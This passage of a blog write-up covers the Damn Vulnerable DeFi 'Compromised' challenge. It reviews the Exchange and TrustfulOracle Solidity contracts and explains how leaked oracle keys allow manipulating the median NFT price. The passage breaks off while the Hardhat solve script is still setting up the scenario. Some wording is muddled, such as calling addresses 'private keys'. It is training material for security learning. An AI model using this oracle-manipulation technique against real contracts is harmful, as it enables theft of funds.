class=\"token keyword\">constructor</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> oracleAddress<span class=\"token punctuation\">)</span> <span class=\"token keyword\">payable</span> <span class=\"token punctuation\">{</span>\n    token <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">DamnValuableNFT</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    oracle <span class=\"token operator\">=</span> <span class=\"token function\">TrustfulOracle</span><span class=\"token punctuation\">(</span>oracleAddress<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span></code></pre></div>\n<h3 id=\"functions\" style=\"position:relative;\"><a href=\"#functions\" aria-label=\"functions permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Functions</h3>\n<p><code class=\"language-text\">function buyOne() external payable nonReentrant returns (uint256)</code></p>\n<ul>\n<li>Since it can be called from the outside and is in a payable state, you can check the logic using Ether.</li>\n<li>It is used for branching to measure whether a transaction is possible through the value of <code class=\"language-text\">msg.value</code> of the subject controlling this function.</li>\n</ul>\n<p>✅ The amountPaidInWei value (msg.value of the current subject) must be greater than 0 to pass.</p>\n<ul>\n<li>By calling the getMedianPrice function of TrustOracle Contract, check and return the central point that stores the symbol value of the current NFT token, and it is assigned a value.</li>\n</ul>\n<p>✅ The holding amount must be greater than or equal to the median amount of the current NFT token to pass.</p>\n<ul>\n<li>Based on the safeMint function of the nft contract, minting is carried out to <code class=\"language-text\">msg.sender</code>, and based on the <code class=\"language-text\">sendValue</code> function, the holding amount — the value of the current nft token amount is transmitted.</li>\n</ul>\n<p><code class=\"language-text\">function sellOne(uint256 tokenId) external nonReentrant</code></p>\n<ul>\n<li>This function is also in a state that can be controlled from the outside.</li>\n</ul>\n<p>✅ For the msg.sender address value, check that the owner is the same by inquiring the tokenId value in the instance state of the current nft token contract.</p>\n<p>✅ Query the tokenId of the nft token contract and check whether the contract is in Approve state by targeting the address of the contract.</p>\n<ul>\n<li>Same as the buyone function, the holding amount and the token amount are compared.</li>\n</ul>\n<p>✅ The value of address(this).balance must be greater than or equal to the current token amount.</p>\n<ul>\n<li>Delivers the holding token to address(this), and burns the token when the nft token contract instance state is present.</li>\n<li>Send the calculated amount to msg.sender.</li>\n<li>In this contract, when calling the contract from the outside, receive() external payable is set, so it can be confirmed that handling of Ether is possible.</li>\n</ul>\n<blockquote>\n<p>TrustOracleInitializer.sol &#x26;&#x26; TrustfullOracle.sol</p>\n</blockquote>\n<h3 id=\"init-1\" style=\"position:relative;\"><a href=\"#init-1\" aria-label=\"init 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Init</h3>\n<div class=\"gatsby-highlight\" data-language=\"solidity\"><pre class=\"language-solidity\"><code class=\"language-solidity\"><span class=\"token builtin\">bytes32</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">constant</span> TRUSTED_SOURCE_ROLE <span class=\"token operator\">=</span> <span class=\"token function\">keccak256</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"TRUSTED_SOURCE_ROLE\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token builtin\">bytes32</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">constant</span> INITIALIZER_ROLE <span class=\"token operator\">=</span> <span class=\"token function\">keccak256</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"INITIALIZER_ROLE\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token comment\">// Source address => (symbol => price)</span>\n<span class=\"token keyword\">mapping</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> <span class=\"token operator\">=></span> <span class=\"token keyword\">mapping</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">string</span> <span class=\"token operator\">=></span> <span class=\"token builtin\">uint256</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">private</span> pricesBySource<span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">modifier</span> <span class=\"token function\">onlyTrustedSource</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span><span class=\"token function\">hasRole</span><span class=\"token punctuation\">(</span>TRUSTED_SOURCE_ROLE<span class=\"token punctuation\">,</span> msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">_</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">modifier</span> <span class=\"token function\">onlyInitializer</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span><span class=\"token function\">hasRole</span><span class=\"token punctuation\">(</span>INITIALIZER_ROLE<span class=\"token punctuation\">,</span> msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">_</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">event</span> <span class=\"token function\">UpdatedPrice</span><span class=\"token punctuation\">(</span>\n    <span class=\"token builtin\">address</span> <span class=\"token keyword\">indexed</span> source<span class=\"token punctuation\">,</span>\n    <span class=\"token builtin\">string</span> <span class=\"token keyword\">indexed</span> symbol<span class=\"token punctuation\">,</span>\n    <span class=\"token builtin\">uint256</span> oldPrice<span class=\"token punctuation\">,</span>\n    <span class=\"token builtin\">uint256</span> newPrice\n<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">constructor</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token keyword\">memory</span> sources<span class=\"token punctuation\">,</span> <span class=\"token builtin\">bool</span> enableInitialization<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>sources<span class=\"token punctuation\">.</span>length <span class=\"token operator\">></span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> sources<span class=\"token punctuation\">.</span>length<span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token function\">_setupRole</span><span class=\"token punctuation\">(</span>TRUSTED_SOURCE_ROLE<span class=\"token punctuation\">,</span> sources<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>enableInitialization<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token function\">_setupRole</span><span class=\"token punctuation\">(</span>INITIALIZER_ROLE<span class=\"token punctuation\">,</span> msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span></code></pre></div>\n<ul>\n<li>The <code class=\"language-text\">priceBySource</code> mapping structure is composed of two types. It is managed in the form of <code class=\"language-text\">(symbol => price).</code></li>\n<li>Since the security structure for each role is applied to each account in the beginning, there is a function to check the modifier that determines whether the role of <code class=\"language-text\">TRUSTED_SOURCE_ROLE</code>, <code class=\"language-text\">INITIALIER_ROLE</code> is possessed.</li>\n</ul>\n<h3 id=\"functions-1\" style=\"position:relative;\"><a href=\"#functions-1\" aria-label=\"functions 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Functions</h3>\n<p><code class=\"language-text\">function postPrice(string calldata symbol, uint256 newPrice) external onlyTrustedSource</code></p>\n<p>📥 <code class=\"language-text\">_setPrice</code> (msg.sender, symbol, newPrice)</p>\n<ul>\n<li>With the (symbol => price) mapping structure, the data is processed with each old and new value and the update proceeds.</li>\n</ul>\n<p>function getMedianPrice(string calldata symbol) external view returns (uint256)</p>\n<p>📥 (return) <code class=\"language-text\">_computeMedianPrice(symbol)</code></p>\n<ul>\n<li>Symbol data is temporarily managed as a memory state.</li>\n<li>You can see that the center value of the data is returned after sorting the entire price information based on the symbol value.</li>\n</ul>\n<h2 id=\"vulnerability\" style=\"position:relative;\"><a href=\"#vulnerability\" aria-label=\"vulnerability permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerability</h2>\n<p>The exchange is using the actual purchase function by calculating the midpoint of the NFT price in the oracle object using the getMedianPrice() method.</p>\n<div class=\"gatsby-highlight\" data-language=\"solidity\"><pre class=\"language-solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">function</span> <span class=\"token function\">getMedianPrice</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">string</span> <span class=\"token keyword\">calldata</span> symbol<span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token keyword\">view</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">return</span> <span class=\"token function\">_computeMedianPrice</span><span class=\"token punctuation\">(</span>symbol<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token comment\">// [OMIT]</span>\n<span class=\"token keyword\">function</span> <span class=\"token function\">_computeMedianPrice</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">string</span> <span class=\"token keyword\">memory</span> symbol<span class=\"token punctuation\">)</span> <span class=\"token keyword\">private</span> <span class=\"token keyword\">view</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token builtin\">uint256</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token keyword\">memory</span> prices <span class=\"token operator\">=</span> <span class=\"token function\">_sort</span><span class=\"token punctuation\">(</span><span class=\"token function\">getAllPricesForSymbol</span><span class=\"token punctuation\">(</span>symbol<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token comment\">// calculate median price</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>prices<span class=\"token punctuation\">.</span>length <span class=\"token operator\">%</span> <span class=\"token number\">2</span> <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token builtin\">uint256</span> leftPrice <span class=\"token operator\">=</span> prices<span class=\"token punctuation\">[</span><span class=\"token punctuation\">(</span>prices<span class=\"token punctuation\">.</span>length <span class=\"token operator\">/</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n        <span class=\"token builtin\">uint256</span> rightPrice <span class=\"token operator\">=</span> prices<span class=\"token punctuation\">[</span>prices<span class=\"token punctuation\">.</span>length <span class=\"token operator\">/</span> <span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token punctuation\">(</span>leftPrice <span class=\"token operator\">+</span> rightPrice<span class=\"token punctuation\">)</span> <span class=\"token operator\">/</span> <span class=\"token number\">2</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">return</span> prices<span class=\"token punctuation\">[</span>prices<span class=\"token punctuation\">.</span>length <span class=\"token operator\">/</span> <span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span></code></pre></div>\n<p>address used to obtain the original value of the NFT price can be checked through the distribution code above. Based on the three addresses, the dependent user accounts of this contract can be identified, which are used to obtain the ownership and median value of the NFT price, respectively.</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">'0xA73209FB1a42495120166736362A1DfA9F95A105',\n'0xe92401A4d3af5E446d93D11EEc806b1462b39D15',\n'0x81A5D6E50C214044bE44cA0CB057fe119097850c'\n\n\"DVNFT\"\n\"DVNFT\"\n\"DVNFT\"\n\nINITIAL_NFT_PRICE = 999 ether\nINITIAL_NFT_PRICE = 999 ether\nINITIAL_NFT_PRICE = 999 ether</code></pre></div>\n<ul>\n<li>We previously received specific hex data from the target web application server, and as a result of analyzing it, we were able to confirm that it was the Oracle address of the contract.</li>\n<li>Among them, you can check the private keys <code class=\"language-text\">0xe92401A4d3af5E446d93D11EEc806b1462b39D15 and 0x81A5D6E50C214044bE44cA0CB057fe119097850c</code>, respectively.</li>\n<li>If we can set some half of the data in the logic to obtain this median value, we can confirm that it is possible to create a specific median price at a desired price. In other words, the problem arises with the mechanism used to update the Oracle price.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"solidity\"><pre class=\"language-solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">function</span> <span class=\"token function\">postPrice</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">string</span> <span class=\"token keyword\">calldata</span> symbol<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint256</span> newPrice<span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> onlyTrustedSource <span class=\"token punctuation\">{</span>\n    <span class=\"token function\">_setPrice</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">,</span> symbol<span class=\"token punctuation\">,</span> newPrice<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">function</span> <span class=\"token function\">_setPrice</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> source<span class=\"token punctuation\">,</span> <span class=\"token builtin\">string</span> <span class=\"token keyword\">memory</span> symbol<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint256</span> newPrice<span class=\"token punctuation\">)</span> <span class=\"token keyword\">private</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token builtin\">uint256</span> oldPrice <span class=\"token operator\">=</span> pricesBySource<span class=\"token punctuation\">[</span>source<span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span>symbol<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    pricesBySource<span class=\"token punctuation\">[</span>source<span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span>symbol<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> newPrice<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">emit</span> <span class=\"token function\">UpdatedPrice</span><span class=\"token punctuation\">(</span>source<span class=\"token punctuation\">,</span> symbol<span class=\"token punctuation\">,</span> oldPrice<span class=\"token punctuation\">,</span> newPrice<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span></code></pre></div>\n<p>Calling the postPrice method after the Oracle price has been updated exists on an additional individual Oracle. Because the exposed Oracle private key exists, all transactions can be made, so you can create any transaction you want.</p>\n<h2 id=\"solve\" style=\"position:relative;\"><a href=\"#solve\" aria-label=\"solve permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Solve</h2>\n<div class=\"gatsby-highlight\" data-language=\"tsx\"><pre class=\"language-tsx\"><code class=\"language-tsx\"><span class=\"token keyword\">const</span> <span class=\"token punctuation\">{</span> expect <span class=\"token punctuation\">}</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span><span class=\"token string\">'chai'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">const</span> <span class=\"token punctuation\">{</span> BigNumber <span class=\"token punctuation\">}</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span><span class=\"token string\">'ethers'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">const</span> <span class=\"token punctuation\">{</span> ethers<span class=\"token punctuation\">,</span> network<span class=\"token punctuation\">}</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span><span class=\"token string\">'hardhat'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">const</span> web3 <span class=\"token operator\">=</span> <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span><span class=\"token string\">'web3'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token function\">describe</span><span class=\"token punctuation\">(</span><span class=\"token string\">'Compromised challenge'</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">function</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n\n    <span class=\"token keyword\">const</span> sources <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span>\n        <span class=\"token string\">'0xA73209FB1a42495120166736362A1DfA9F95A105'</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string\">'0xe92401A4d3af5E446d93D11EEc806b1462b39D15'</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string\">'0x81A5D6E50C214044bE44cA0CB057fe119097850c'</span>\n    <span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token comment\">// const tx1 = '0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9';</span>\n    <span class=\"token comment\">// const tx2 = '0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48';</span>\n\n    <span class=\"token keyword\">let</span> deployer<span class=\"token punctuation\">,</span> attacker<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">const</span> <span class=\"token constant\">EXCHANGE_INITIAL_ETH_BALANCE</span> <span class=\"token operator\">=</span> ethers<span class=\"token punctuation\">.</span>utils<span class=\"token punctuation\">.</span><span class=\"token function\">parseEther</span><span class=\"token punctuation\">(</span><span class=\"token string\">'9990'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">const</span> <span class=\"token constant\">INITIAL_NFT_PRICE</span> <span class=\"token operator\">=</span> ethers<span class=\"token punctuation\">.</span>utils<span class=\"token punctuation\">.</span><span class=\"token function\">parseEther</span><span class=\"token punctuation\">(</span><span class=\"token string\">'999'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token function\">before</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">async</span> <span class=\"token keyword\">function</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token comment\">/** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */</span>\n        <span class=\"token comment\">// const trace = await network.provider.send(\"debug_traceTransaction\", [</span>\n        <span class=\"token comment\">//     tx1,</span>\n        <span class=\"token comment\">//   ]);</span>\n        <span class=\"token comment\">// console.log(trace);</span>\n\n\n        <span class=\"token punctuation\">[</span>deployer<span class=\"token punctuation\">,</span> attacker<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">await</span> ethers<span class=\"token punctuation\">.</span><span class=\"token function\">getSigners</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token keyword\">const</span> ExchangeFactory <span class=\"token operator\">=</span> <span class=\"token keyword\">await</span> ethers<span class=\"token punctuation\">.</span><span class=\"token function\">getContractFactory</span><span class=\"token punctuation\">(</span><span class=\"token string\">'Exchange'</span><span class=\"token punctuation\">,</span> deployer<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">const</span> DamnValuableNFTFactory <span class=\"token operator\">=</span> <span class=\"token keyword\">await</span> ethers<span class=\"token punctuation\">.</span><span class=\"token function\">getContractFactory</span><span class=\"token punctuation\">(</span><span class=\"token string\">'DamnValuableNFT'</span><span class=\"token punctuation\">,</span> deployer<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">const</span> TrustfulOracleFactory <span class=\"token operator\">=</span> <span class=\"token keyword\">await</span> ethers<span class=\"token punctuation\">.</span><span class=\"token function\">getContractFactory</span><span class=\"token punctuation\">(</span><span class=\"token string\">'TrustfulOracle'</span><span class=\"token punctuation\">,</span> deployer<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">const</span> TrustfulOracleInitializerFactory <span class=\"token operator\">=</span> <span class=\"token keyword\">await</span> ethers<span class=\"token punctuation\">.</span><span class=\"token function\">getContractFactory</span><span class=\"token punctuation\">(</span><span class=\"token string\">'TrustfulOracleInitializer'</span><span class=\"token punctuation\">,</span> deployer<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token comment\">// Initialize balance of the trusted source addresses</span>\n        <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">let</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> sources<span class=\"token punctuation\">.</span>length<span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n            <span class=\"token keyword\">await</span> ethers<span class=\"token punctuation\">.</span>provider<span class=\"token punctuation\">.</span><span class=\"token function\">send</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"hardhat_setBalance\"</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">[</span>\n                sources<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>\n                <span class=\"token string\">\"0x1bc16d674ec80000\"</span><span class=\"token punctuation\">,</span> <span class=\"token comment\">// 2 ETH</span>\n            <span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token function\">expect</span><span class=\"token punctuation\">(</span>\n                <span class=\"token keyword\">await</span> ethers<span class=\"token punctuation\">.</span>provider<span class=\"token punctuation\">.</span><span class=\"token function\">getBalance</span><span class=\"token punctuation\">(</span>sources<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n            <span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>to<span class=\"token punctuation\">.</span><span class=\"token function\">equal</span><span class=\"token punctuation\">(</span>ethers<span class=\"token punctuation\">.</span>utils<span class=\"token punctuation\">.</span><span class=\"token function\">parseEther</span><span class=\"token punctuation\">(</span><span class=\"token string\">'2'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>\n\n        <span class=\"token comment\">// Attacker starts with 0.1 ETH in balance</span>\n        <span class=\"token keyword\">await</span> ethers<span class=\"token punctuation\">.</span>provider<span class=\"token punctuation\">.</span><span class=\"token function\">send</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"hardhat_setBalance\"</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">[</span>\n            attacker<span class=\"token punctuation\">.</span>address<span class=\"token punctuation\">,</span>\n            <span class=\"token string\">\"0x16345785d8a0000\"</span><span class=\"token punctuation\">,</span> <span class=\"token comment\">// 0.1 ETH</span>\n        <span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">expect</span><span class=\"token punctuation\">(</span>\n            <span class=\"token keyword\">await</span> ethers<span class=\"token punctuation\">.</span>provider<span class=\"token punctuation\">.</span><span class=\"token function\">getBalance</span><span class=\"token punctuation\">(</span>attacker<span class=\"token punctuation\">.</span>address<span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>to<span class=\"token punctuation\">.</span><span class=\"token function\">equal</span><span class=\"token punctuation\">(</span>ethers<span class=\"token punctuation\">.</span>utils<span class=\"token punctuation\">.</span><span class=\"token function\">parseEther</span><span class=\"token punctuation\">(</span><span class=\"token string\">'0.1'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token comment\">// Deploy the oracle and setup the trusted sources with initial prices</span>\n        <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>oracle <span class=\"token operator\">=</span> <span class=\"token keyword\">await</span> TrustfulOracleFactory<span class=\"token punctuation\">.</span><span class=\"token function\">attach</span><span class=\"token punctuation\">(</span>\n            <span class=\"token keyword\">await</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">await</span> TrustfulOracleInitializerFactory<span class=\"token punctuation\">.</span><span class=\"token function\">deploy</span><span class=\"token punctuation\">(</span>\n                sources<span class=\"token punctuation\">,</span>\n                <span class=\"token punctuation\">[</span><span class=\"token string\">\"DVNFT\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"DVNFT\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"DVNFT\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>\n                <span class=\"token punctuation\">[</span><span class=\"token constant\">INITIAL_NFT_PRICE</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">INITIAL_NFT_PRICE</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">INITIAL_NFT_PRICE</span><span class=\"token punctuation\">]</span>\n   